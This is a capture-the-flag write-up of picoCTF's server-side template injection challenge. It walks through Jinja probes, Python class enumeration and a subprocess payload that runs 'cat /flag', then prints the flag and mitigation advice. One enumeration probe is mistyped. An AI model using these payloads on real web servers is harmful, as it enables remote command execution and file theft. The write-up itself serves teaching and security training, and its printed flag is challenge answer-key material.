# 1. SSTI1

> I made a cool website where you can announce whatever you want! Try it out!\
> I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:53639/).

---

## Solution:

This challenge is an **SSTI (Server-Side Template Injection)** web exploitation challenge. The instance was launched on demand and hosted at the provided URL. The goal is to inject template expressions into the announcement input (or a similar user-controlled field) so the server evaluates them and reveals secrets (or allows command execution).

### Steps & thought process

1. **Visited the challenge URL** and looked for an input area that renders our input back to the page (e.g., an announcements field). The page likely uses a templating engine which may evaluate template expressions we supply.

   ![Challenge Page](Screenshot%202025-10-27%20232621.png)

2. **Tested for SSTI with a simple arithmetic payload** to check if input is evaluated by the template engine. For example, submitting `{{7*7}}` (Jinja-like) or `${7*7}` (other engines) in the announcement content and then refreshing the page. If the page shows `49` instead of the literal `{{7*7}}`, itâ€™s vulnerable to SSTI.

   Example payloads to try in the announcement form or URL-parameters:
   ```jinja
   {{7*7}}
   {{'test'.upper()}}
   ```

3. **Enumerated the template engine and environment** by sending other benign payloads to identify behavior (e.g., string methods, attribute access). For Python/Jinja SSTI, more advanced probes include:
   ```jinja
   {{''.class.__mro__}}
   {{''. __class__.__mro__[1].__subclasses__()}}
   ```
   These payloads help discover Python internals and available classes which can lead to finding `subprocess.Popen` or similar to execute commands.

4. **Escalated from code execution to reading files**. Once execution is possible, common next steps are to locate file I/O or OS command execution classes and read the flag file (often `/flag` or similar) or run `cat` on a known path. Example approach (conceptual):
   ```jinja
   {{ ''.__class__.__mro__[2].__subclasses__()[40]('/bin/cat /flag', shell=True, stdout=-1).communicate() }}
   ```
   *Note: exact subclass index varies by Python version and environment; the above is an illustration of the approach.*

5. **Retrieved the flag** after successful exploitation. The challenge page then displayed the flag in the webpage (or we extracted it from command output).

---

## Flag:

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}
```

---

## Concepts learnt:

- **Server-Side Template Injection (SSTI)**  
  SSTI occurs when a web application unsafely includes user input inside template rendering. If the templating engine evaluates expressions from user input, attackers can execute code on the server.

- **Template engines** (Jinja2, Twig, ERB, etc.) behave differently; payloads must be tailored to the target engine's syntax and features.

- **Enumerating Python internals** via template expressions can reveal methods and classes that allow command execution (for example, locating `subprocess.Popen` through `__class__` and `__mro__`).

- **Security lesson:** never render user-supplied templates or evaluate user input inside templates. Escape/sanitize inputs and apply server-side checks.

---

## Notes:

- The instance for this challenge is typically ephemeral (on-demand). Indexes of subclasses and exact exploitation payloads vary by runtime, so trial-and-error is necessary when progressing from detection to exploitation.
- I first used lightweight probes (`{{7*7}}`, `{{'test'.upper()}}`) to confirm vulnerability before attempting more aggressive enumeration.
- Alternative mitigations to SSTI include using safe template contexts, disabling `eval`-like features, or using a sandboxed evaluation layer.

---

## Example payloads & experimentation (illustrative only)

```
# Example 1: Detection (Jinja-style)
{{7*7}}

# Example 2: String method check
{{ 'pico'.upper() }}

# Example 3: Enumerate classes (Python/Jinja)
{{ ''.__class__.__mro__[1].__subclasses__() }}

# Example 4: Conceptual (find subprocess and run cat)
# Note: indexes will differ across environments; this is conceptual pseudopayload
{{ ''.__class__.__mro__[2].__subclasses__()[index]('/bin/cat /flag', shell=True, stdout=-1).communicate() }}
```

---

## Resources:

- [OWASP: Server Side Template Injection](https://owasp.org/www-community/attacks/Server_Side_Template_Injection)  
- [Jinja2 SSTI cheat sheet (community resources)]
---
